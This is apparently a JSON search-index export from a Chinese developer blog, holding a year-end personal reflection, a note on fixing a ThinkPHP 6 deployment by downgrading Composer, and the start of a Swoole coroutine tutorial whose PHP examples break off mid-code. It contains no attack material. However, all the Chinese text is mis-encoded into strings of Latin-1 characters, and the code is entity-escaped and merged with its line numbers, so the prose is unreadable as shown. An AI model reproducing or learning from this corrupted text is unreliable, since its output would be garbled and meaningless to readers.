ä¸ä¹…å‰çœ‹è¿‡ä¸€éƒ¨ç”µå½±ã€Šç§’æ•°äº”å˜ç±³ã€‹ï¼Œé‡Œé¢æœ‰ä¸€å¥è¯ç»™æˆ‘çš„å°è±¡ç‰¹åˆ«æ·±åˆ»â€”â€”å³ä½¿é€šäº†ä¸€åƒæ¡çŸ­ä¿¡ï¼Œæˆ‘ä»¬çš„å¿ƒä¹Ÿåªèƒ½æ‹‰è¿‘ä¸€å˜ç±³è€Œå·²ã€‚ ç»“åˆè‡ªå·±å‰äº›æ—¥å­çš„ä¸€æ®µç»å†ï¼Œç¡®å®æ˜¯è¿™æ ·ï¼Œè‹¥åªæ˜¯æ’è§£å¯‚å¯ï¼Œè°éƒ½å¯ä»¥å–ä»£ã€‚ å…³äºå·¥ä½œä¸€è°ˆåˆ°å¹²æˆ‘ä»¬è¿™ä¸€è¡Œçš„ï¼Œå¾ˆå¤šäººå¯èƒ½ç¬¬ä¸€ååº”å¯èƒ½å°±æ˜¯åŠ ç­ï¼Œæˆ‘å¹¶ä¸åå¯¹åŠ ç­ï¼Œåªæ˜¯æˆ‘ä»¬åœ¨åŠ ç­æ—¶ï¼Œåº”è¯¥æ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆåŠ ç­ï¼Ÿ æ˜¯å› ä¸ºæ•ˆç‡å¤ªä½ï¼Œæœ¬è¯¥å·¥ä½œæ—¶é—´å†…å®Œæˆçš„äº‹æƒ…ï¼Œæ²¡æœ‰å®Œæˆï¼Ÿ æ˜¯å› ä¸ºäº‹æƒ…å¤ªå¤šï¼Ÿ è¿˜æ˜¯åªæ˜¯å› ä¸ºè€æ¿æ²¡æœ‰èµ°ï¼Ÿ å½“æˆ‘åœ¨è°ˆè®ºåŠ ç­æ—¶ï¼Œæˆ‘è°ˆäº›ä»€ä¹ˆâ€”â€”ä¸åŠ æ²¡æœ‰æ„ä¹‰çš„ç­ã€‚ å…³äºå­¦ä¹ å‰æ®µæ—¶é—´å·¥ä½œä¸Šå‡ºäº†ä¸€ç‚¹äº‹æ•…â€”â€”å› ä¸ºå®ä½“æœºæ²¡æœ‰è®¾ç½®é˜²ç«å¢™å¯¼è‡´è¢«ç—…æ¯’å…¥ä¾µã€‚ é˜²ç«å¢™åœ¨æˆ‘çš„å°è±¡ä¸­å±äºé‚£ç§åº•å±‚æ¯”è¾ƒé«˜æ·±ï¼Œæ™¦æ¶©éš¾æ‡‚çš„ä¸œè¥¿ï¼Œå†åŠ ä¸ŠåŸºç¡€çŸ¥è¯†çš„åŒ®ä¹è®©æˆ‘å¯¹é˜²ç«å¢™é¢‘é¢‘æ„Ÿåˆ°ææƒ§ã€‚ å¦‚æœå¯¹æ•´ä½“æ²¡æœ‰æ¸…æ™°çš„è®¤è¯†ï¼Œåªæ˜¯ç›²ç›®çš„ç½‘ä¸ŠæœæŸ¥ç€åˆ«äººå†™å¥½çš„è§„åˆ™ï¼Œè¿æ°”å¥½ï¼Œå¯èƒ½èƒ½è§£å†³;è¿æ°”ä¸å¥½ï¼Œå¯èƒ½è¿˜ä¼šå¯¼è‡´æœåŠ¡å™¨è¿æ¥ä¸ä¸Šï¼Œåˆ«é—®æˆ‘æ˜¯æ€ä¹ˆçŸ¥é“çš„â€¦ è€Œå½“éœ€è¦é¢ä¸´æ¯”è¾ƒå¤æ‚çš„å®šåˆ¶åŒ–éœ€æ±‚æ—¶ï¼Œå°±æ›´å¯¸æ­¥éš¾è¡Œäº†ã€‚ å…³äºå­¦ä¹ ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä¸€ç›´æƒ³æé†’è‡ªå·±çš„ï¼šåŠ¡å®åŸºç¡€ï¼Œä¸è¦åšâ€œçŸ¥è¯†çš„æ¬è¿å·¥â€ã€‚ é™„ä¸€å¼ è®½åˆºå½“ä»£çš„å¼€å‘è€…çš„å›¾ ä¸çŸ¥ä½•æ—¶ï¼ŒæŠ€æœ¯åœˆè¶Šæ¥è¶Šå–œæ¬¢è´©å–ç„¦è™‘äº†ï¼Œæ¯å¤©é†’æ¥ï¼Œé¢å¯¹å¤§å¤šéƒ½æ˜¯è¿™æ ·çš„ä¿¡æ¯ï¼š â€œå…³äº XXX çš„é‚£äº›ä½ ä¸çŸ¥é“çš„çœŸç›¸â€ â€œåè¡€æ•´ç†ï¼Œä¸‡å­—é•¿æ–‡æå®š XXXâ€ â€œå…¨ç½‘æœ€ç¡¬æ ¸è§£è¯» XXX åº•å±‚åŸç†â€ â€œæå®šè¿™é“ XXX é¢è¯•é¢˜ï¼Œå¤§å‚éšä¾¿è¿›â€ â€œå­—èŠ‚å†…éƒ¨ç–¯ä¼ çš„ä¸€ä»½ XXX å¤±ä¼ èµ„æ–™â€ â€¦ ä»ä¾§é¢ä¹Ÿåæ˜ å‡ºå›½å†…çš„è½¯ä»¶å¼€å‘è€…æ‰¿æ‹…çš„èŒä¸šå‘å±•å‹åŠ›ã€‚ å’Œå¤§éƒ¨åˆ†äººä¸€æ ·ï¼Œæˆ‘ä¹Ÿæ—¶å¸¸ä¼šç„¦è™‘ï¼Œä½†è¿˜æ˜¯è¦å¯¹æœªæ¥æŒä¹è§‚æ€åº¦ï¼Œæ¯•ç«Ÿé«˜çº§äººæ‰æ— è®ºä½•æ—¶éƒ½æ˜¯ç´§ç¼ºçš„ã€‚ äº‹å®ä¸Šï¼Œæˆ‘ä»¬ä¸å¾—ä¸æ‰¿è®¤ä¸€ä¸ªæ®‹é…·çš„äº‹å®â€”â€”å¤§éƒ¨åˆ†ä»ä¸šè€…åªæ˜¯åœ¨åšé‡å¤æ€§ã€åˆ›æ–°ä»·å€¼ä½çš„å·¥ä½œã€‚è¿™äº›å·¥ä½œåœ¨ä¸€å®šç¨‹åº¦ä¸Šä¼šé€æ¸è¢«å–ä»£ï¼Œè¿™ä¸æ„å‘³ç€è¿™äº›å·¥ä½œä¼šè¢«å–ç¼”ï¼Œè€Œæ˜¯æ›´é«˜æ•ˆçš„å®Œæˆã€‚ é€šä¿—ä¸€ç‚¹è®²å°±æ˜¯ä¸€ä¸ªé«˜æ‰‹å¯ä»¥å–ä»£N ä¸ªä½æ‰‹ã€‚ å…³äºæ€è€ƒæˆ‘ä¸€ç›´è§‰å¾—æœ‰ä¸‰ä»¶äº‹æƒ…åœ¨æˆ‘ä»¬è¿™ä¸ªæ—¶ä»£ä¸­æä¸ºé‡è¦ï¼Œä»–ä»¬åˆ†åˆ«æ˜¯ï¼š ç¼–ç¨‹ å†™ä½œ è‹±è¯­ ç¼–ç¨‹æ¯‹åº¸ç½®ç–‘ï¼ŒæŠ€æœ¯æ”¹å˜ä¸–ç•Œã€‚ å†™ä½œåœ¨è¿™ä¸ªä¿¡æ¯çˆ†ç‚¸çš„æ—¶ä»£ï¼Œä¸ºçŸ¥è¯†ä»˜è´¹çš„è¡Œä¸ºå·²ç»é€æ¸è¢«æ¥å—ï¼Œä»˜è´¹æ¸ é“æˆä¸ºæœ‰æ•ˆçš„è¿‡æ»¤æ‰‹æ®µï¼Œä¹Ÿä¿ƒä½¿åŸåˆ›ä½œè€…è¾“å‡ºæ›´é«˜è´¨é‡çš„å†…å®¹ã€‚ å½“ç„¶å†™ä½œèƒ½åŠ›å¹¶ä¸æ˜¯ä¸€è¹´è€Œå°±ï¼Œéœ€è¦ä¸æ–­ç§¯ç´¯ã€å®è·µã€æ€»ç»“ã€‚ ä»å‡ºæ¥åï¼Œæˆ‘å°±æœ‰ä¸€ç›´åˆ»æ„ä¿æŒè¿™ä¸ªä¹ æƒ¯ï¼Œå¤§å¤šæ•°æ—¶å€™æˆ‘ä¼šé€‰æ‹©ç”¨æ–‡å­—æ¥è®°å½•ï¼ˆåšå®¢ä¹Ÿæ˜¯ä¸€ç§è®°å½•æ–¹å¼ï¼‰ï¼Œå¯èƒ½æ˜¯è§‰å¾—ç”¨æ–‡å­—è®°å½•çš„æ–¹å¼æ›´çœŸå®ä¸€äº›ï¼Œå›å¤´çœ‹åˆ°é‚£äº›å†™æ»¡åœ°æ–‡å­—ï¼Œä¼šå‘ç°ä¸çŸ¥ä¸è§‰ä¸­å·²ç»é™ªä¼´æˆ‘èµ°äº†è¿™ä¹ˆè¿œã€‚ è‹±è¯­ç¬¬ä¸‰ä»¶äº‹æ˜¯æˆ‘ä¸€ç›´æƒ³è¦åšï¼Œå´è¿˜æ²¡æœ‰å¼€å§‹åšï¼ˆæˆ–è€…è¯´æ²¡æœ‰åšæŒä¸‹å»ï¼‰ã€‚å› ä¸ºæˆ‘ä¸€ç›´è®¤åŒä¸€ä¸ªè§‚ç‚¹ï¼šå¦‚æœä½ è‹±æ–‡ä¸è¡Œï¼Œä½ åŸºæœ¬ä¸é«˜æ‰‹æ— ç¼˜äº†ã€‚ å¦‚ä½•æˆåŠŸåšå¥½ä¸€ä»¶äº‹å¦‚ä½•æˆåŠŸåšå¥½ä¸€ä»¶äº‹æƒ…ï¼Ÿç»™æˆ‘æœ€å¤§çš„æ„Ÿè§¦å°±æ˜¯ï¼Œä¸€å®šè¦å…·å¤‡ä»¥ä¸‹ä¸¤ä¸ªå› ç´ ï¼š å…´è¶£ æˆå°±æ„Ÿ å‰è€…æ˜¯å¼€å§‹çš„åŠ¨åŠ›ï¼Œåè€…æ˜¯åšæŒä¸‹å»çš„åŠ¨åŠ›ã€‚ å…³äºåˆ†äº«ä¸ºä»€ä¹ˆè¦å†™åšå®¢ï¼Ÿ ä¸€æ–¹é¢ï¼Œé˜¶æ®µæ€§åœ°å¯¹ä¸€äº›çŸ¥è¯†è¿›è¡Œæ€»ç»“ï¼Œæ–¹ä¾¿è‡ªå·±æ—¥åéœ€è¦æ—¶æŸ¥æ‰¾ã€‚ å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä¸€ç›´è§‰å¾—çŸ¥è¯†ä¸æ˜¯ç¯®å­é‡Œé¢çš„é¸¡è›‹ï¼Œä¸ä¼šå› ä¸ºä½ åˆ†äº«ç»™ä»–äººè€Œå‡å°‘ï¼Œç›¸åï¼Œä½ ä¼šæ”¶è·åˆ°æ›´å¤šå…¶ä»–çš„ä¸œè¥¿ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å¼€å§‹å†™åšå®¢çš„åˆè¡·ã€‚ æ—¶è‡³ä»Šæ—¥ï¼Œå°ç ´ç«™æˆç«‹äº†å…­ä¸ªæœˆï¼Œåˆšå¥½ä¸€ç™¾å…«åå¤©ã€‚ç´¯è®¡å‘æ–‡ä¸€ç™¾ä½™ç¯‡ï¼Œè™½ç„¶ä¸æ˜¯æ¯ç¯‡éƒ½æ˜¯åƒå­—é•¿æ–‡ï¼Œä½†æ¯ç¯‡éƒ½æ˜¯ç»è¿‡æ€è€ƒä¸€ä¸ªå­—ä¸€ä¸ªå­—ç å‡ºæ¥çš„ã€‚ å¯æ— å¥ˆæ•´ä½“è®¿å®¢å´å°‘å¾—å¯æ€œï¼Œè¿™ä¸ç¦è®©æˆ‘é™·å…¥æ²‰æ€ï¼Œæ˜¯å¦æœ‰å¿…è¦æŠŠéƒ¨åˆ†ç²¾åå†…å®¹å‘å¸ƒåˆ°å¾®ä¿¡å…¬ä¼—å·ä¸Šã€‚ ç›®å‰è¿˜æ²¡æœ‰å…¬ä¼—å·ï¼Œåˆ›å»ºä¸€ä¸ªå…¬ä¼—å·å¹¶ä¸éš¾ï¼Œéš¾çš„æ˜¯å¦‚ä½•å–ä¸€ä¸ªä¸é”™åœ°åå­—åŠç»´æŠ¤å¥½è¿™ä¸ªå…¬ä¼—å·ã€‚ è€Œå¯¹äºå–åå­—è¿™ä»¶äº‹æƒ…ï¼Œæˆ‘å‘æ¥å¹¶ä¸æ“…é•¿ï¼Œæ‰€ä»¥è¿™ä»¶äº‹æƒ…å°±ä¸€ç›´è¢«é—²ç½®äº†ã€‚ å…³äºæœªæ¥é©¬ä¸Šå°±è¦è¿æ¥æ–°çš„ä¸€å¹´äº†ï¼Œå…ä¸äº†åˆ¶å®šè®¡åˆ’ä¸ºæ–°çš„ä¸€å¹´åšå¥½å‡†å¤‡ã€‚æˆ‘è¿™ä¸ªäººä¼¼ä¹ä»æ¥éƒ½ä¸ç¼ºè®¡åˆ’ï¼Œç¼ºçš„æ˜¯å®Œæˆè®¡åˆ’çš„æ‰§è¡ŒåŠ›ã€‚ç›¸æ¯”äºè®¡åˆ’æœ¬èº«ï¼Œä¼¼ä¹æ›´åº”è¯¥å…³æ³¨å®Œæˆè®¡åˆ’çš„æ•ˆç‡ã€‚ åˆ›å»ºä¸€ä¸ªå…¬ä¼—å·ï¼Ÿ æŒæ¡ Go è¯­è¨€ åŠ¡å®è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»ŸåŸç†ã€æ•°æ®ç»“æ„åŠè®¡ç®—æœºç½‘ç»œåŸºç¡€ è‡³å°‘å®Œæˆä¸€ç™¾é“ LeetCode é¢˜ç›® ç»§ç»­åšæŒè·‘æ­¥ æœ€åçš„æœ€åç”¨ä¸€æ®µæˆ‘æ¯”è¾ƒå–œæ¬¢çš„è¯ï¼Œä½œä¸ºç»“æŸè¯­ï¼š ä½ å¯ä»¥æŠ±æ€¨ï¼Œä½ å¯ä»¥å“­æ³£ï¼Œå¯ä½ è¦çŸ¥é“æ˜å¤©å¤ªé˜³è¿˜æ˜¯ä¸€æ ·ä¼šå‡èµ·ï¼Œä½ åªéœ€è¦çŸ¥é“è¿™ä¸ªä¸–ç•Œå¯¹è°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½ è¿‡å¾—å¾ˆç´¯ï¼Œå…¶ä»–äººä¹Ÿä¸€æ ·æ²¡æœ‰é¡ºé£é¡ºæ°´ã€‚ç´¯äº†ï¼Œå°±å»è¢«çªé‡Œå†¥æƒ³å‘å‘†; æ¸´äº†ï¼Œå°±ç©¿ä¸Šæ¯›ç»’å…”çš„æ‹–é‹å“’å“’ä¸‹æ¥¼ï¼Œä¹°ä¸€æ¯å†°é•‡æŸ æª¬èŒ¶ï¼Œæˆ–è€…å»è·¯è¾¹ç…®ä¸€ç¢—çƒ­æ°”è…¾è…¾çš„ç‰›è‚‰é¢;é—»ä¸€é—»è·¯è¾¹çš„é‡èŠï¼Œçœ‹å‡ éƒ¨å¹½é»˜æˆ–æ„Ÿäººçš„ç”µå½±;å“ªæ€•è¿™ä¸€åˆ‡åªæ˜¯ä¸ºäº†å–æ‚¦é‚£ä¸ªå¿ƒæƒ…ä¸å¥½çš„è‡ªå·±ã€‚æœ€åï¼Œå¤šå¤šåŠªåŠ›ï¼ŒåŠªåŠ›åšä¸€ä¸ªå¯çˆ±çš„äººï¼Œä¸€ä¸ªé—ªé—ªå‘å…‰çš„äººï¼Œä¸è®¨å¥½ï¼Œä¸å°†å°±ï¼Œå¯¹è¿‡å¾€çš„è‹¦éš¾æƒ…æ·±æ„é‡ï¼Œä½†ç»ä¸å›å¤´ï¼Œä½ åªéœ€è¦ä¸€è·¯å‘å‰ï¼ŒæŠ«è†æ–©æ£˜å°±å¥½ï¼Œåˆ«å¿˜äº†ï¼Œå¸¦ç€ç¬‘ï¼šï¼‰","categories":[{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}]},{"title":"Composer 2.0 å‘ä¸‹ä¸å…¼å®¹å¯¼è‡´æ‰©å±•å®‰è£…å‡ºé”™","slug":"composer-2-0-backward-incompatibility-causes-extension-installation-error","date":"2020-12-17T12:40:38.000Z","updated":"2020-12-17T12:41:30.424Z","comments":true,"path":"composer-2-0-backward-incompatibility-causes-extension-installation-error/","link":"","permalink":"https://www.0x2beace.com/composer-2-0-backward-incompatibility-causes-extension-installation-error/","excerpt":"ä»Šå¤©åœ¨éƒ¨ç½²æœåŠ¡å™¨ç¯å¢ƒæ—¶ï¼Œé‡åˆ°ä¸€ä¸ªç”±Composer ç‰ˆæœ¬å‘ä¸‹ä¸å…¼å®¹è€Œå¼•å‘çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"ä»Šå¤©åœ¨éƒ¨ç½²æœåŠ¡å™¨ç¯å¢ƒæ—¶ï¼Œé‡åˆ°ä¸€ä¸ªç”±Composer ç‰ˆæœ¬å‘ä¸‹ä¸å…¼å®¹è€Œå¼•å‘çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚ é—®é¢˜æè¿°åå°Api åº”ç”¨æ˜¯ç”¨ThinkPHP6.0 çš„å¤šåº”ç”¨æ¨¡å¼å¼€å‘çš„ï¼Œèµ·åˆéƒ¨ç½²æ—¶ï¼Œæ€»æ˜¯æç¤ºæ‰¾ä¸åˆ°æ§åˆ¶å™¨ã€‚ å½“æ—¶å°±æ¯”è¾ƒéƒé—·ï¼Œæ€ä¹ˆä¼šæ‰¾ä¸åˆ°æ§åˆ¶å™¨å‘¢ï¼Ÿè¿™ä¸ªå¼‚å¸¸é€šå¸¸åªä¼šåœ¨æ²¡æœ‰å¼€å¯å¤šåº”ç”¨æ¨¡å¼æ—¶æ‰ä¼šå‡ºç°ï¼Œå¯æ˜¯æˆ‘æ˜æ˜å·²ç»å¼€å¯äº†å¤šåº”ç”¨æ¨¡å¼ï¼Œä¹Ÿå®‰è£…äº†ç›¸å…³æ‰©å±•ï¼ˆComposer 2.0.x æ‰§è¡Œ composer install æ²¡æœ‰ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼‰ã€‚ æ­£å½“æˆ‘ç™¾æ€ä¸å¾—å…¶è§£æ—¶ï¼Œä¸ç»æ„é—´çœ‹åˆ°äº†æˆ‘ç›®å‰æ‰€ä½¿ç”¨çš„ Composer ç‰ˆæœ¬æ˜¯ 2.0.xã€‚ å›å¤´å¯¹æ¯”äº†ä¸€ä¸‹æˆ‘æœ¬åœ°çš„ç‰ˆæœ¬ï¼š1.8ï¼ŒGoogle ä¸€ä¸‹æ‰å‘ç°Composer 2.0 ç³»åˆ—æ˜¯æœ€è¿‘æ‰å‘å¸ƒçš„ï¼Œäºæ˜¯é©¬ä¸Šå°±æƒ³åˆ°äº†æ˜¯å¦æ˜¯ Composer å‘ä¸‹ä¸å…¼å®¹å¯¼è‡´ã€‚ å¥½å®¶ä¼™ï¼ŒçœŸçš„æ˜¯å…¼å®¹æ€§å¯¼è‡´çš„é—®é¢˜ï¼š è§£å†³åŠæ³•æ—¢ç„¶æ˜¯ç‰ˆæœ¬è¿‡é«˜å¯¼è‡´çš„å…¼å®¹æ€§é—®é¢˜ï¼Œé‚£å°±å¥½åŠäº†ï¼Œç›´æ¥é™ä½ç‰ˆæœ¬å³å¯ã€‚ Composer é™çº§éå¸¸ç®€å•ï¼Œä¸ç”¨é‡æ–°ç¼–è¯‘å®‰è£…ï¼Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ï¼š 1composer self-update 1.8.0 å¦‚æœä½ ä¸çŸ¥é“æœ‰å“ªäº›ç‰ˆæœ¬å¯é€‰æ‹©ï¼Œå¯ä»¥æŸ¥çœ‹å®˜æ–¹çš„å‘å¸ƒå†å²ã€‚ å‚è€ƒé“¾æ¥ ThinkPHP V6.0.5ç‰ˆæœ¬å‘å¸ƒâ€”â€”å…¼å®¹Composer2.0 Composer ä¸­æ–‡æ–‡æ¡£","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Composer","slug":"Composer","permalink":"https://www.0x2beace.com/tags/Composer/"}]},{"title":"Swoole åç¨‹å¿«é€Ÿä¸Šæ‰‹","slug":"swoole-coroutine-quick-start","date":"2020-12-15T13:37:42.000Z","updated":"2020-12-15T13:38:38.874Z","comments":true,"path":"swoole-coroutine-quick-start/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-quick-start/","excerpt":"æœ€è¿‘æœ‰å¹¸è¯»åˆ° daydaygo çš„ swoole åç¨‹åˆä½“éªŒï¼Œä¸€æ–‡ä»åç¨‹çš„æ‰§è¡Œçš„è§’åº¦çª¥æ¢ Swoole çš„åç¨‹è°ƒåº¦ï¼Œå¹¶è¯¦ç»†è¯´æ˜äº†ä¸ºä»€ä¹ˆåç¨‹ä¼šå¿«ã€‚","text":"æœ€è¿‘æœ‰å¹¸è¯»åˆ° daydaygo çš„ swoole åç¨‹åˆä½“éªŒï¼Œä¸€æ–‡ä»åç¨‹çš„æ‰§è¡Œçš„è§’åº¦çª¥æ¢ Swoole çš„åç¨‹è°ƒåº¦ï¼Œå¹¶è¯¦ç»†è¯´æ˜äº†ä¸ºä»€ä¹ˆåç¨‹ä¼šå¿«ã€‚ æ–‡ç« é€šä¿—æ˜“æ‡‚ï¼Œç¬”è€…åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›è‡ªå·±çš„ç†è§£ï¼Œä»¥æ­¤æˆæ–‡ã€‚ ä¸»è¦ä»ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢æ¥äº†è§£åç¨‹ï¼š åç¨‹çš„æ‰§è¡Œé¡ºåºï¼šåç¨‹è°ƒåº¦ åç¨‹ä¸ºä»€ä¹ˆå¿«ï¼šå‡å°‘IOé˜»å¡å¸¦æ¥çš„æ€§èƒ½ä¼˜åŠ¿ åç¨‹æ‰§è¡Œé¡ºåºæŒ‰ç…§æƒ¯ä¾‹ï¼Œå…ˆæ¥çœ‹ä¸€ä¸ªæœ€ç®€å•çš„åç¨‹ä»£ç ã€‚ 12345678910&lt;?phpgo(function () &#123; echo &quot;1&quot;.PHP_EOL;&#125;);echo &quot;2&quot;.PHP_EOL;go(function () &#123; echo &quot;3&quot;.PHP_EOL;&#125;); åœ¨Swooleä¸­ Swoole\\Coroutine::create ç­‰ä»·äº go å‡½æ•°ï¼ˆSwoole\\Coroutine å‰ç¼€çš„ç±»åå¯ä»¥æ˜ å°„ä¸º Coï¼‰ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªåç¨‹ã€‚ è¯¥å‡½æ•°æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå›è°ƒå‡½æ•°çš„å†…å®¹å°±æ˜¯åç¨‹éœ€è¦æ‰§è¡Œçš„å†…å®¹ã€‚ ä¸Šé¢çš„ä»£ç æ‰§è¡Œç»“æœä¸ºï¼š 123123 ä»æ‰§è¡Œç»“æœçš„è§’åº¦æ¥çœ‹ï¼Œåç¨‹ç‰ˆçš„ä»£ç å’Œä¼ ç»Ÿçš„åŒæ­¥ä»£ç ï¼Œçœ‹èµ·æ¥å¹¶æ— å·®å¼‚ã€‚ä½†åç¨‹çš„å®é™…æ‰§è¡Œè¿‡ç¨‹å´æ˜¯ï¼š è¿è¡Œä¸Šé¢é‚£æ®µåç¨‹ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªæ–°è¿›ç¨‹ å½“ä»£ç æ‰§è¡Œåˆ°go()éƒ¨åˆ†æ—¶ï¼Œä¼šåœ¨å½“å‰åç¨‹ä¸­åˆ›å»ºä¸€ä¸ªåç¨‹ï¼Œè¾“å‡º1ï¼Œåç¨‹é€€å‡º ä»£ç ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¾“å‡º 2 å†æ¬¡é‡åˆ°go()å‡½æ•°ï¼Œè¾“å‡º3 åç¨‹é€€å‡ºï¼Œè¿›ç¨‹é€€å‡ºï¼Œæ‰§è¡Œå®Œæˆ åç¨‹è°ƒåº¦\\Co::sleep() å‡½æ•°å’Œsleep()å‡½æ•°å·®ä¸å¤šï¼Œä½†æ˜¯å®ƒæ¨¡æ‹Ÿçš„æ˜¯ IO ç­‰å¾…ã€‚ 123456789101112&lt;?phpgo(function () &#123; &#x2F;&#x2F; åªæ–°å¢äº†ä¸€è¡Œä»£ç  Co::sleep(1); echo &quot;1&quot;.PHP_EOL;&#125;);echo &quot;2&quot;.PHP_EOL;go(function () &#123; echo &quot;3&quot;.PHP_EOL;&#125;); æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š 123231 æ€ä¹ˆä¸æ˜¯é¡ºåºæ‰§è¡Œçš„äº†ï¼Ÿå®é™…æ‰§è¡Œè¿‡ç¨‹ï¼š è¿è¡Œä¸Šé¢é‚£æ®µåç¨‹ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªæ–°è¿›ç¨‹ é‡åˆ° go()ï¼Œåœ¨å½“å‰è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªåç¨‹ åç¨‹å‘ä¸‹æ‰§è¡Œé‡åˆ°IO é˜»å¡ï¼Œåç¨‹è®©å‡ºæ§åˆ¶ï¼Œè¿›å…¥åç¨‹è°ƒåº¦é˜Ÿåˆ— è¿›ç¨‹ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¾“å‡º 2 åˆ›å»ºç¬¬äºŒä¸ªåç¨‹ï¼Œè¾“å‡º3 ç¬¬ä¸€ä¸ªåç¨‹å‡†å¤‡å°±ç»ªï¼Œè¾“å‡º 1 åç¨‹é€€å‡ºï¼Œè¿›ç¨‹é€€å‡ºï¼Œæ‰§è¡Œå®Œæˆ åˆ°è¿™é‡Œï¼Œå·²ç»å¯ä»¥çœ‹åˆ°Swoole ä¸­åç¨‹ä¸è¿›ç¨‹çš„å…³ç³»ï¼Œä»¥åŠåç¨‹è°ƒåº¦çš„è¿‡ç¨‹ã€‚ ä¸‹é¢è¿™å¼ å›¾å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°äºŒè€…åŒºåˆ«ä¸è”ç³»ï¼š åç¨‹å¿«åœ¨å“ªé‡Œï¼Ÿå¤§å®¶ä½¿ç”¨åç¨‹ï¼Œå¬åˆ°æœ€å¤šçš„åŸå› ï¼Œå¯èƒ½å°±æ˜¯å› ä¸ºåç¨‹å¿«ã€‚é‚£åç¨‹ç›¸æ¯”ä¼ ç»ŸåŒæ­¥ä»£ç å€’åº•å¿«åœ¨å“ªé‡Œå‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹è®¡ç®—æœºä¸­çš„ä¸¤ç±»ä»»åŠ¡ã€‚ CPUå¯†é›†å‹CPU å¯†é›†å‹ä¹Ÿå«è®¡ç®—å¯†é›†å‹ï¼Œ ç‰¹ç‚¹æ˜¯éœ€è¦è¿›è¡Œå¤§é‡ç§‘å­¦è®¡ç®—ï¼Œæ¯”å¦‚è®¡ç®—åœ†å‘¨ç‡ã€å¯¹è§†é¢‘è¿›è¡Œé«˜æ¸…è§£ç ï¼ŒåƒCPUã€‚ IO å¯†é›†å‹æ¶‰åŠåˆ°ç½‘ç»œã€ç£ç›˜IOçš„ä»»åŠ¡éƒ½æ˜¯IOå¯†é›†å‹ä»»åŠ¡ï¼Œç‰¹ç‚¹æ˜¯ä¸åƒCPUï¼Œä»»åŠ¡çš„å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨ç­‰å¾…IOæ“ä½œå®Œæˆï¼Œå› ä¸ºIOçš„é€Ÿåº¦è¿œè¿œä½äºCPUå’Œå†…å­˜çš„é€Ÿåº¦ã€‚ å…¶æ¬¡éœ€è¦äº†è§£ä¸¤ä¸ªæ¦‚å¿µï¼š å¹¶è¡Œï¼šåŒä¸€æ—¶åˆ»ï¼ŒåŒä¸€CPUåªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡ï¼Œè¦Nä¸ªä»»åŠ¡åŒæ—¶æ‰§è¡Œï¼Œå°±éœ€è¦æœ‰å¤šä¸ªCPU æ‰è¡Œã€‚ å¹¶å‘ï¼šåŒä¸€æ—¶åˆ»æ‰§è¡ŒN ä¸ªä»»åŠ¡ã€‚ç”±äºCPU ä»»åŠ¡åˆ‡æ¢é€Ÿåº¦éå¸¸å¿«ï¼Œå·²ç»å¿«åˆ°äº†äººç±»æ„ŸçŸ¥æé™ã€‚ äº†è§£äº†è¿™äº›åŸºç¡€ä¹‹åï¼Œå¯¹åç¨‹çš„èƒ½åŠ›æ˜¯ä¸æ˜¯ä¹Ÿæ›´æ¸…æ™°äº†ä¸€äº›ï¼Œä»¥åŠåç¨‹ä¸ºä»€ä¹ˆä¼šâ€œå¿«â€äº†ã€‚ å› ä¸ºåç¨‹ä»…åœ¨ IOé˜»å¡ æ—¶æ‰ä¼šè§¦å‘è°ƒåº¦ï¼Œä»è€Œå‡å°‘ç­‰å¾…IO æ“ä½œå®Œæˆçš„æ—¶é—´ã€‚ åç¨‹å®è·µé€šè¿‡å¯¹æ¯”ä¸‹é¢ä¸‰ç§æƒ…å†µï¼ŒåŠ æ·±å¯¹åç¨‹çš„ç†è§£ï¼š åŒæ­¥é˜»å¡ç‰ˆï¼š 1234567&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; sleep(1); echo $i . PHP_EOL;&#125;;echo &quot;ok&quot;; å•ä¸ªåç¨‹ç‰ˆï¼š 123456789&lt;?php$n &#x3D; 4;Co\\Run(function () use ($n) &#123; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; Co::sleep(1); echo $i . PHP_EOL; &#125;;&#125;);echo &quot;ok&quot;; å¤šä¸ªåç¨‹ç‰ˆ1.0ï¼ˆIO å¯†é›†å‹ï¼‰ï¼š 123456789&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; go(function () use ($i) &#123; Co::sleep(1); 